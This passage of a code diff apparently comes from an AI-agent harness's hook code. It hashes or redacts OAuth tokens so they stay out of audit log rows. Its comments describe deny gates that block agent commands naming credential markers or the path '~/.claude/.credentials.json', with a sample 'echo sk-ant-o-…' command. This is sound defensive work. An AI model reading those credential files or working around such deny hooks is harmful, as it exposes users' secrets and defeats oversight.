+    raw `operation` (which would otherwise carry the token) with the
+    `command_sha256` anchor. Belt-and-suspenders for the rare case
+    where a sanctioned-shape command also trips the SYSTEM_CONFIG or
+    ROSTER_LOCAL deny — `agent_tool_denied` already gets the same
+    scrub upstream, but this audit row is independent.
+
+    Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
+    :func:`_bash_audit_summary_needs_hashing` (shape-match OR any
+    credential marker), NOT :func:`_is_admin_credential_routine`
+    (role+shape). An env-roster mismatch caller's sanctioned-shape
+    command — or any non-shape Bash command that merely carries a
+    credential marker — is denied yet still carries the token; hashing
+    on the broader gate keeps the token out of this row regardless of
+    whether the carve-out allowed or denied.
     """
     if target_path is None:
         path_str = ""
@@ -2657,11 +3326,32 @@ def _write_system_config_audit_row(
         path_str = str(target_path)
         before = _path_sha256(target_path)
     if tool_name == "Bash":
-        operation = truncate_text(str(tool_input.get("command") or ""), 240)
+        bash_command = str(tool_input.get("command") or "")
+        if _bash_audit_summary_needs_hashing(bash_command):
+            operation = (
+                f"command_sha256={_credential_routine_command_sha256(bash_command)}"
+            )
+        else:
+            operation = truncate_text(bash_command, 240)
     else:
+        # Codex r3 BLOCKING (r4, 2026-05-29, #1358): the non-Bash branch
+        # builds `operation` from EVERY raw `tool_input` value — including
+        # `content` on an admin Write/Edit to a protected system-config
+        # path (agent-roster.local.sh / settings.json). When that content
+        # carries an `sk-ant-o…` token, the raw token landed in this
+        # INDEPENDENT `system_config_mutation` row even though the
+        # `agent_tool_denied` row above was already scrubbed. R1–R3 sealed
+        # the Bash writers and the deny/PostToolUse summaries one at a
+        # time; this is the fourth writer in the same class. Redact
+        # token-shaped VALUES out of each field (value-only — a credential
+        # FILE PATH such as `~/.claude/.credentials.json` stays as a
+        # forensic anchor, the token bytes do not). The `write_audit`
+        # choke-point (#1358 r4, `_redact_audit_detail_credentials`) is the
+        # belt-and-suspenders SSOT that catches this for every writer; the
+        # explicit redaction here keeps the at-source contract reviewable.
         operation = json.dumps(
             {
-                key: truncate_text(str(value), 120)
+                key: _redact_credential_token_values(truncate_text(str(value), 120))
                 for key, value in tool_input.items()
                 if value
             },
@@ -2777,6 +3467,49 @@ def handle_pretool(payload: dict[str, Any], agent: str) -> int:
 
     if reason:
         detail["reason"] = reason
+        # Codex r1 BLOCKING #1 r3 (2026-05-29): if the Bash command was
+        # a sanctioned credential routine, the exemption row above was
+        # hash-only, but a downstream deny (e.g. `--token-file
+        # ~/.claude/.credentials.json` tripping the credential-path
+        # argv gate) would otherwise write the raw command into
+        # `detail.summary.command` via :func:`tool_input_summary`.
+        # Substitute the hash-only summary so the audit log NEVER
+        # persists the OAuth token, regardless of which deny gate the
+        # carve-out shape ultimately tripped.
+        #
+        # Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
+        # :func:`_bash_audit_summary_needs_hashing` (sanctioned shape OR
+        # any credential marker), NOT :func:`_is_admin_credential_routine`
+        # (role+shape). Two leaks this closes:
+        #   1. env-roster MISMATCH: `BRIDGE_ADMIN_AGENT_ID` set but the
+        #      agent's SESSION-TYPE.md is not `admin`. The carve-out
+        #      correctly DENIES via the substring guard, but the deny
+        #      row's scrub was gated on the role+shape predicate — so it
+        #      did NOT fire and the raw token landed in summary.command.
+        #   2. NON-shape credential mention: a bare `echo sk-ant-o-…`
+        #      (or any command naming a credential marker) is denied by
+        #      `_raw_mentions_claude_credentials` but is not the
+        #      sanctioned routine shape, so the shape-only scrub missed
+        #      it and the raw token leaked into the deny row.
+        # Hashing on the broader gate keeps the token out of the audit
+        # log for any credential-bearing Bash command. Non-credential
+        # commands keep their forensic `command` detail.
+        #
+        # Codex r2 BLOCKING (r3, 2026-05-29): non-Bash tools (Grep
+        # `pattern`, Read/Write `file_path`, etc.) can also carry a
+        # token-shaped VALUE that `tool_input_summary` would otherwise
+        # persist raw (e.g. `Grep pattern=sk-ant-o-…`). The Bash branch
+        # hashes the whole command; the non-Bash branch instead redacts
+        # only the token-shaped VALUES so a credential FILE PATH stays
+        # as a forensic anchor while the token bytes never survive.
+        if tool_name == "Bash":
+            bash_command = str(tool_input.get("command") or "")
+            if _bash_audit_summary_needs_hashing(bash_command):
+                detail["summary"] = _credential_routine_hash_only_summary(
+                    bash_command
+                )
+        elif isinstance(detail.get("summary"), dict):
+            detail["summary"] = _redact_credential_summary(detail["summary"])
         write_audit("agent_tool_denied", agent or "unknown", detail)
         # Both the generic system-config deny and the more-specific
         # roster-local deny (codex r1 #341 CP2) are protected-path
@@ -2807,6 +3540,38 @@ def handle_posttool_common(payload: dict[str, Any], agent: str, action: str) -> 
         "cwd": str(payload.get("cwd") or current_agent_workdir()),
         "summary": tool_input_summary(tool_name, tool_input),
     }
+    # Codex r2 BLOCKING #1 r4 (#1358, 2026-05-29): when the Bash command
+    # was a sanctioned credential routine, both `agent_tool_use`
+    # (PostToolUse success) and `agent_tool_failure` (PostToolUseFailure)
+    # would otherwise persist the raw command — including the
+    # here-string / heredoc token body — in `detail.summary.command` via
+    # :func:`tool_input_summary`. R2 / R3 sealed the PreToolUse exemption
+    # and downstream-deny paths; the PostToolUse audit row is the last
+    # writer that touches the same `tool_input["command"]` text. Apply
+    # the same hash-only substitution here so the OAuth token never
+    # lands in the audit log regardless of which hook event captured it.
+    #
+    # Codex r2 BLOCKING (r3, 2026-05-29): the scrub gate is
+    # :func:`_bash_audit_summary_needs_hashing` (sanctioned shape OR any
+    # credential marker), NOT :func:`_is_admin_credential_routine`
+    # (role+shape). A PostToolUse row can fire for an env-roster-mismatch
+    # caller whose sanctioned-shape command was NOT exempted (PreToolUse
+    # denied), or for any non-shape Bash command that merely names a
+    # credential marker, with the token still riding in
+    # `tool_input["command"]`; hashing on the broader gate keeps the
+    # token out of this row too. Non-credential Bash commands keep their
+    # existing forensic detail.
+    # Non-Bash tools (Grep `pattern`, Read/Write `file_path`, etc.) can
+    # carry token-shaped VALUES too — redact those out of the PostToolUse
+    # summary the same way the deny path does (codex r2 BLOCKING r3).
+    if tool_name == "Bash":
+        bash_command = str(tool_input.get("command") or "")
+        if _bash_audit_summary_needs_hashing(bash_command):
+            detail["summary"] = _credential_routine_hash_only_summary(
+                bash_command
+            )
+    elif isinstance(detail.get("summary"), dict):
+        detail["summary"] = _redact_credential_summary(detail["summary"])
     target_agent = detect_target_agent(tool_name, tool_input, agent)
     if target_agent:
         detail["target_agent"] = target_agent
